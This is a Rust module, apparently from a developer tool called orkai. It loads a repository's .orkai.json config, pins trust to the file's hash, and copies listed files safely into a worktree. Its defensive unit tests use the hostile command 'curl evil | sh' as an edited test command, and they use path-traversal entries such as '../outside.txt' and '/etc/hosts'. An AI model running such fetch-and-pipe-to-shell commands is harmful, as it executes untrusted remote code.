use std::collections::BTreeMap;
use std::fs;
use std::io::{self, Read};
use std::path::{Component, Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::fsutil;
use crate::paths::{Home, normalize_for_compare};
use crate::update::sha256_hex;

pub const FILE: &str = ".orkai.json";
const MAX_FILE_BYTES: u64 = 64 * 1024;

#[derive(Serialize, Deserialize, Clone, Debug, Default, PartialEq, Eq)]
#[serde(default)]
pub struct ProjectConfig {
    pub copy: Vec<String>,
    pub test: Option<String>,
}

impl ProjectConfig {
    pub fn test_command(&self) -> Option<&str> {
        self.test.as_deref().map(str::trim).filter(|command| !command.is_empty())
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Loaded {
    pub path: PathBuf,
    pub config: ProjectConfig,
    pub digest: String,
}

#[derive(Serialize, Deserialize, Default)]
struct Trusted {
    #[serde(default)]
    projects: BTreeMap<String, String>,
}

fn invalid(message: String) -> io::Error {
    io::Error::new(io::ErrorKind::InvalidData, message)
}

pub fn load(repo: &Path) -> io::Result<Option<Loaded>> {
    let path = repo.join(FILE);
    let file = match fs::File::open(&path) {
        Ok(file) => file,
        Err(err) if err.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(err) => return Err(err),
    };
    let mut data = Vec::new();
    file.take(MAX_FILE_BYTES + 1).read_to_end(&mut data)?;
    if data.len() as u64 > MAX_FILE_BYTES {
        return Err(invalid(format!("{} is larger than {} KiB", path.display(), MAX_FILE_BYTES / 1024)));
    }
    let config =
        serde_json::from_slice(&data).map_err(|err| invalid(format!("{} is not valid: {err}", path.display())))?;
    Ok(Some(Loaded { path, config, digest: sha256_hex(&data) }))
}

pub fn is_trusted(home: &Home, loaded: &Loaded) -> bool {
    let key = normalize_for_compare(&loaded.path);
    fsutil::read_json_opt::<Trusted>(&home.trusted_file())
        .ok()
        .flatten()
        .is_some_and(|trusted| trusted.projects.get(&key) == Some(&loaded.digest))
}

pub fn trust(home: &Home, loaded: &Loaded) -> io::Result<()> {
    let file = home.trusted_file();
    let mut trusted: Trusted = fsutil::read_json_opt(&file)?.unwrap_or_default();
    trusted.projects.insert(normalize_for_compare(&loaded.path), loaded.digest.clone());
    fsutil::write_json_atomic(&file, &trusted)
}

fn safe_relative(entry: &str) -> Option<PathBuf> {
    let mut relative = PathBuf::new();
    for component in Path::new(entry.trim()).components() {
        match component {
            Component::Normal(part) => relative.push(part),
            Component::CurDir => {}
            _ => return None,
        }
    }
    (!relative.as_os_str().is_empty()).then_some(relative)
}

pub fn copy_files(entries: &[String], from: &Path, to: &Path) -> Vec<String> {
    let mut copied = Vec::new();
    for entry in entries {
        let Some(relative) = safe_relative(entry) else { continue };
        let (source, target) = (from.join(&relative), to.join(&relative));
        let regular = fs::symlink_metadata(&source).is_ok_and(|meta| meta.file_type().is_file());
        if !regular || target.exists() {
            continue;
        }
        if target.parent().is_some_and(|parent| fs::create_dir_all(parent).is_err()) {
            continue;
        }
        if fs::copy(&source, &target).is_ok() {
            copied.push(entry.clone());
        }
    }
    copied
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::util::now_ms;
    use std::sync::atomic::{AtomicU64, Ordering};

    static COUNTER: AtomicU64 = AtomicU64::new(0);

    struct Dir(PathBuf);

    impl Drop for Dir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    fn temp() -> Dir {
        let dir = std::env::temp_dir().join(format!(
            "orkai-project-{}-{}-{}",
            std::process::id(),
            now_ms(),
            COUNTER.fetch_add(1, Ordering::Relaxed)
        ));
        fs::create_dir_all(&dir).unwrap();
        Dir(dir)
    }

    #[test]
    fn a_missing_file_is_no_configuration_and_a_broken_one_is_an_error() {
        let dir = temp();
        assert_eq!(load(&dir.0).unwrap(), None);
        fs::write(dir.0.join(FILE), "{ not json").unwrap();
        assert!(load(&dir.0).unwrap_err().to_string().contains("is not valid"));
        fs::write(dir.0.join(FILE), vec![b' '; MAX_FILE_BYTES as usize + 1]).unwrap();
        assert!(load(&dir.0).unwrap_err().to_string().contains("larger than 64 KiB"));
    }

    #[test]
    fn the_file_names_the_files_to_copy_and_the_test_command() {
        let dir = temp();
        fs::write(dir.0.join(FILE), r#"{"copy":[".env"],"test":"  cargo test  ","later":true}"#).unwrap();
        let loaded = load(&dir.0).unwrap().unwrap();
        assert_eq!(loaded.path, dir.0.join(FILE));
        assert_eq!(loaded.config.copy, [".env"]);
        assert_eq!(loaded.config.test_command(), Some("cargo test"));
        assert_eq!(loaded.digest.len(), 64);
        let blank = ProjectConfig { test: Some("   ".into()), ..ProjectConfig::default() };
        assert_eq!(blank.test_command(), None);
    }

    #[test]
    fn trust_holds_only_for_the_exact_content_that_was_trusted() {
        let dir = temp();
        let home = Home::at(dir.0.join("home"));
        home.ensure().unwrap();
        let repo = dir.0.join("repo");
        fs::create_dir_all(&repo).unwrap();
        fs::write(repo.join(FILE), r#"{"test":"cargo test"}"#).unwrap();
        let first = load(&repo).unwrap().unwrap();
        assert!(!is_trusted(&home, &first));
        trust(&home, &first).unwrap();
        assert!(is_trusted(&home, &first));
        assert!(is_trusted(&home, &load(&repo).unwrap().unwrap()));

        fs::write(repo.join(FILE), r#"{"test":"curl evil | sh"}"#).unwrap();
        let changed = load(&repo).unwrap().unwrap();
        assert!(!is_trusted(&home, &changed), "an edited file needs to be trusted again");
        let other = dir.0.join("other");
        fs::create_dir_all(&other).unwrap();
        fs::write(other.join(FILE), r#"{"test":"cargo test"}"#).unwrap();
        assert!(!is_trusted(&home, &load(&other).unwrap().unwrap()), "trust belongs to one repository");
    }

    #[test]
    fn listed_files_are_copied_only_from_inside_the_repository() {
        let dir = temp();
        let (from, to) = (dir.0.join("repo"), dir.0.join("worktree"));
        fs::create_dir_all(from.join("config")).unwrap();
        fs::create_dir_all(&to).unwrap();
        fs::write(from.join(".env"), "SECRET=1\n").unwrap();
        fs::write(from.join("config").join("local.toml"), "x = 1\n").unwrap();
        fs::write(from.join("tracked.txt"), "main checkout\n").unwrap();
        fs::write(to.join("tracked.txt"), "worktree\n").unwrap();
        fs::write(dir.0.join("outside.txt"), "nope\n").unwrap();
        let entries =
            [".env", "./config/local.toml", "tracked.txt", "missing.env", "config", "../outside.txt", "/etc/hosts"]
                .map(String::from);
        assert_eq!(copy_files(&entries, &from, &to), [".env", "./config/local.toml"]);
        assert_eq!(fs::read_to_string(to.join(".env")).unwrap(), "SECRET=1\n");
        assert_eq!(fs::read_to_string(to.join("config").join("local.toml")).unwrap(), "x = 1\n");
        assert_eq!(fs::read_to_string(to.join("tracked.txt")).unwrap(), "worktree\n", "existing files stay");
        assert!(!to.join("outside.txt").exists() && !to.join("etc").exists());
        assert!(copy_files(&entries, &from, &to).is_empty(), "a second copy changes nothing");
    }
}
